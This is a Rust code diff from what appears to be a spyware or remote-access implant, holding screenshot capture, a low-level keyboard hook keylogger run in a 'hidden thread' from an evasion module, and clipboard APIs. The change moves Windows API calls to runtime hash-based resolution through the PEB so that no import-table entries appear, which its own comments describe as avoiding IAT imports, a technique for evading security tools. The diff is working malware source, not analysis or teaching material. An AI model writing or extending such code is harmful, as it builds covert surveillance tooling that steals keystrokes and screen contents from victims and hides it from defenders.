@@ -28,28 +28,7 @@ use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
 
 // ── pe_resolve helpers ────────────────────────────────────────────────────────
-
-/// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
-const fn hash_str_const(s: &[u8]) -> u32 {
-    let mut h: u32 = pe_resolve::SEED;
-    let mut i = 0;
-    while i < s.len() {
-        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
-        i += 1;
-    }
-    h
-}
-
-/// Compile-time djb2 hash for wide strings (matches pe_resolve::hash_wstr).
-const fn hash_wstr_const(w: &[u16]) -> u32 {
-    let mut h: u32 = pe_resolve::SEED;
-    let mut i = 0;
-    while i < w.len() {
-        h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
-        i += 1;
-    }
-    h
-}
+use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 /// Resolve a function pointer from a DLL that is already loaded in the PEB.
 unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Result<T> {
@@ -109,13 +88,13 @@ const HASH_GETMODULEHANDLEW: u32           = hash_str_const(b"GetModuleHandleW\0
 type FnGetDC                      = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
 type FnReleaseDC                  = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
 type FnGetSystemMetrics           = unsafe extern "system" fn(i32) -> i32;
-type FnGetMonitorInfoW            = unsafe extern "system" fn(*mut std::ffi::c_void, *mut winapi::um::winuser::MONITORINFO) -> i32;
-type FnEnumDisplayMonitors        = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *mut winapi::shared::windef::RECT, std::ffi::c_long) -> i32>, std::ffi::c_long) -> i32;
+type FnGetMonitorInfoW            = unsafe extern "system" fn(*mut std::ffi::c_void, *mut crate::win_types::MONITORINFO) -> i32;
+type FnEnumDisplayMonitors        = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *mut crate::win_types::RECT, std::ffi::c_long) -> i32>, std::ffi::c_long) -> i32;
 type FnSetWindowsHookExW          = unsafe extern "system" fn(i32, Option<unsafe extern "system" fn(i32, usize, usize) -> usize>, *mut std::ffi::c_void, u32) -> *mut std::ffi::c_void;
 type FnCallNextHookEx             = unsafe extern "system" fn(*mut std::ffi::c_void, i32, usize, usize) -> usize;
-type FnPeekMessageW               = unsafe extern "system" fn(*mut winapi::um::winuser::MSG, *mut std::ffi::c_void, u32, u32, u32) -> i32;
-type FnTranslateMessage           = unsafe extern "system" fn(*const winapi::um::winuser::MSG) -> i32;
-type FnDispatchMessageW           = unsafe extern "system" fn(*const winapi::um::winuser::MSG) -> usize;
+type FnPeekMessageW               = unsafe extern "system" fn(*mut crate::win_types::MSG, *mut std::ffi::c_void, u32, u32, u32) -> i32;
+type FnTranslateMessage           = unsafe extern "system" fn(*const crate::win_types::MSG) -> i32;
+type FnDispatchMessageW           = unsafe extern "system" fn(*const crate::win_types::MSG) -> usize;
 type FnUnhookWindowsHookEx        = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 type FnGetClipboardSequenceNumber = unsafe extern "system" fn() -> u32;
 type FnOpenClipboard              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
@@ -126,6 +105,25 @@ type FnGetClipboardData           = unsafe extern "system" fn(u32) -> *mut std::
 type FnGlobalLock       = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
 type FnGlobalUnlock     = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 type FnGetModuleHandleW = unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void;
+
+// ── API hash constants & types (gdi32 — resolved at runtime, no IAT) ──────────
+const GDI32_DLL_W: &[u16] = &['g' as u16, 'd' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const HASH_GDI32_DLL: u32              = hash_wstr_const(GDI32_DLL_W);
+const HASH_BITBLT: u32                = hash_str_const(b"BitBlt\0");
+const HASH_CREATECOMPATIBLEBITMAP: u32 = hash_str_const(b"CreateCompatibleBitmap\0");
+const HASH_CREATECOMPATIBLEDC: u32    = hash_str_const(b"CreateCompatibleDC\0");
+const HASH_DELETEDC: u32             = hash_str_const(b"DeleteDC\0");
+const HASH_DELETEOBJECT: u32          = hash_str_const(b"DeleteObject\0");
+const HASH_GETDIBITS: u32            = hash_str_const(b"GetDIBits\0");
+const HASH_SELECTOBJECT: u32          = hash_str_const(b"SelectObject\0");
+
+type FnBitBlt                = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32, i32, i32, *mut std::ffi::c_void, i32, i32, u32) -> i32;
+type FnCreateCompatibleBitmap = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32) -> *mut std::ffi::c_void;
+type FnCreateCompatibleDC    = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnDeleteDC              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnDeleteObject          = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnGetDIBits             = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void, *mut crate::win_types::BITMAPINFO, u32) -> i32;
+type FnSelectObject          = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
 
 // ── Local constants (replacing IAT-producing winapi imports) ──────────────────
 const SM_CXSCREEN: i32       = 0;
@@ -186,11 +184,7 @@ pub fn capture_screenshot(monitor_index: Option<u32>) -> Result<Vec<u8>> {
 
 #[cfg(target_os = "windows")]
 fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
-    use winapi::shared::windef::HBITMAP;
-    use winapi::um::wingdi::{
-        BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDIBits,
-        SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY,
-    };
+    use crate::win_types::{HBITMAP, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
 
     unsafe {
         // Resolve user32 functions at runtime
@@ -200,6 +194,22 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
             resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETDC)?;
         let release_dc: FnReleaseDC =
             resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_RELEASEDC)?;
+
+        // Resolve gdi32 functions at runtime (no IAT entries)
+        let create_compatible_dc: FnCreateCompatibleDC =
+            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_CREATECOMPATIBLEDC)?;
+        let create_compatible_bitmap: FnCreateCompatibleBitmap =
+            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_CREATECOMPATIBLEBITMAP)?;
+        let select_object: FnSelectObject =
+            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_SELECTOBJECT)?;
+        let bitblt: FnBitBlt =
+            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_BITBLT)?;
+        let get_di_bits: FnGetDIBits =
+            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_GETDIBITS)?;
+        let delete_object: FnDeleteObject =
+            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_DELETEOBJECT)?;
+        let delete_dc: FnDeleteDC =
+            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_DELETEDC)?;
 
         let (x, y, width, height) = if let Some(idx) = monitor_index {
             let monitors = enumerate_monitors();
@@ -234,48 +244,48 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
         if hdc_screen.is_null() {
             return Err(anyhow!("GetDC failed"));
         }
-        let hdc_mem = CreateCompatibleDC(hdc_screen);
+        let hdc_mem = create_compatible_dc(hdc_screen);
         if hdc_mem.is_null() {
             release_dc(std::ptr::null_mut(), hdc_screen);
             return Err(anyhow!("CreateCompatibleDC failed"));
         }
-        let hbm: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
+        let hbm: HBITMAP = create_compatible_bitmap(hdc_screen, width, height);
         if hbm.is_null() {
-            DeleteDC(hdc_mem);
+            delete_dc(hdc_mem);
             release_dc(std::ptr::null_mut(), hdc_screen);
             return Err(anyhow!("CreateCompatibleBitmap failed"));
         }
 
-        let old_obj = SelectObject(hdc_mem, hbm as _);
-        let blt_ok = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, x, y, SRCCOPY);
+        let old_obj = select_object(hdc_mem, hbm as _);
+        let blt_ok = bitblt(hdc_mem, 0, 0, width, height, hdc_screen, x, y, SRCCOPY);
         if blt_ok == 0 {
-            SelectObject(hdc_mem, old_obj);
-            DeleteObject(hbm as _);
-            DeleteDC(hdc_mem);
+            select_object(hdc_mem, old_obj);
+            delete_object(hbm as _);
+            delete_dc(hdc_mem);
             release_dc(std::ptr::null_mut(), hdc_screen);
             return Err(anyhow!("BitBlt failed"));
         }
 
         let bmi_header = BITMAPINFOHEADER {
-            biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
-            biWidth: width,
-            biHeight: -height,
-            biPlanes: 1,
-            biBitCount: 32,
-            biCompression: BI_RGB,
-            biSizeImage: 0,
-            biXPelsPerMeter: 0,
-            biYPelsPerMeter: 0,
-            biClrUsed: 0,
-            biClrImportant: 0,
+            bi_size: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
+            bi_width: width,
+            bi_height: -height,
+            bi_planes: 1,
+            bi_bit_count: 32,
+            bi_compression: BI_RGB,
+            bi_size_image: 0,
+            bi_x_pels_per_meter: 0,
+            bi_y_pels_per_meter: 0,
+            bi_clr_used: 0,
+            bi_clr_important: 0,
         };
         let mut bmi = BITMAPINFO {
-            bmiHeader: bmi_header,
-            bmiColors: [std::mem::zeroed(); 1],
+            bmi_header: bmi_header,
+            bmi_colors: [std::mem::zeroed(); 1],
         };
         let pixel_count = (width as usize) * (height as usize);
         let mut pixels: Vec<u8> = vec![0u8; pixel_count * 4];
-        let scan_lines = GetDIBits(
+        let scan_lines = get_di_bits(
             hdc_mem,
             hbm,
             0,
@@ -284,9 +294,9 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
             &mut bmi,
             DIB_RGB_COLORS,
         );
-        SelectObject(hdc_mem, old_obj);
-        DeleteObject(hbm as _);
-        DeleteDC(hdc_mem);
+        select_object(hdc_mem, old_obj);
+        delete_object(hbm as _);
+        delete_dc(hdc_mem);
         release_dc(std::ptr::null_mut(), hdc_screen);
 
         if scan_lines == 0 {
@@ -346,21 +356,21 @@ fn enumerate_monitors() -> Vec<MonitorRect> {
     GETMONITORINFO_PTR.store(get_monitor_info_w as u64, Ordering::SeqCst);
 
     let monitors: Box<Mutex<Vec<MonitorRect>>> = Box::new(Mutex::new(Vec::new()));
-    let raw = Box::into_raw(monitors) as winapi::shared::minwindef::LPARAM;
+    let raw = Box::into_raw(monitors) as crate::win_types::LPARAM;
 
     unsafe extern "system" fn enum_callback(
-        hmon: winapi::shared::windef::HMONITOR,
-        _hdc: winapi::shared::windef::HDC,
-        _lprc: winapi::shared::windef::LPRECT,
-        dw_data: winapi::shared::minwindef::LPARAM,
-    ) -> winapi::shared::minwindef::BOOL {
+        hmon: crate::win_types::HMONITOR,
+        _hdc: crate::win_types::HDC,
+        _lprc: crate::win_types::LPRECT,
+        dw_data: crate::win_types::LPARAM,
+    ) -> crate::win_types::BOOL {
         let get_monitor_info: FnGetMonitorInfoW = std::mem::transmute(GETMONITORINFO_PTR.load(Ordering::SeqCst));
-        let mut mi: winapi::um::winuser::MONITORINFO = std::mem::zeroed();
-        mi.cbSize = std::mem::size_of::<winapi::um::winuser::MONITORINFO>() as u32;
+        let mut mi: crate::win_types::MONITORINFO = std::mem::zeroed();
+        mi.cb_size = std::mem::size_of::<crate::win_types::MONITORINFO>() as u32;
         if get_monitor_info(hmon, &mut mi) == 0 {
             return 1;
         }
-        let rc = mi.rcMonitor;
+        let rc = mi.rc_monitor;
         let vec_ptr = dw_data as *mut Mutex<Vec<MonitorRect>>;
         if let Ok(mut guard) = (*vec_ptr).lock() {
             guard.push(MonitorRect {
@@ -535,8 +545,7 @@ fn start_keylogger_thread_windows(
     running: Arc<AtomicBool>,
 ) -> std::thread::JoinHandle<()> {
     crate::evasion::spawn_hidden_thread(move || {
-        use winapi::shared::minwindef::{LPARAM, WPARAM};
-        use winapi::shared::ntdef::LRESULT;
+        use crate::win_types::{LPARAM, WPARAM, LRESULT};
 
         // Resolve user32 functions at runtime
         let call_next_hook_ex: FnCallNextHookEx = unsafe {
@@ -610,15 +619,15 @@ fn start_keylogger_thread_windows(
         HOOK_BUFFER_PTR.store(&buffer as *const _ as u64, Ordering::SeqCst);
 
         unsafe extern "system" fn keyboard_proc(
-            n_code: winapi::shared::minwindef::c_int,
+            n_code: crate::win_types::c_int,
             w_param: WPARAM,
             l_param: LPARAM,
         ) -> LRESULT {
             if n_code >= 0 {
-                use winapi::um::winuser::KBDLLHOOKSTRUCT;
+                use crate::win_types::KBDLLHOOKSTRUCT;
 
                 let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
-                let vk_code = kb.vkCode;
+                let vk_code = kb.vk_code;
                 let flags = kb.flags;
                 // LLKHF_UP = 0x80 — key is being released
                 let pressed = (flags & 0x80) == 0;
@@ -656,7 +665,7 @@ fn start_keylogger_thread_windows(
             }
 
             // Message pump — required for low-level hooks to work.
-            let mut msg: winapi::um::winuser::MSG = std::mem::zeroed();
+            let mut msg: crate::win_types::MSG = std::mem::zeroed();
             loop {
                 let has_msg = peek_message_w(
                     &mut msg,
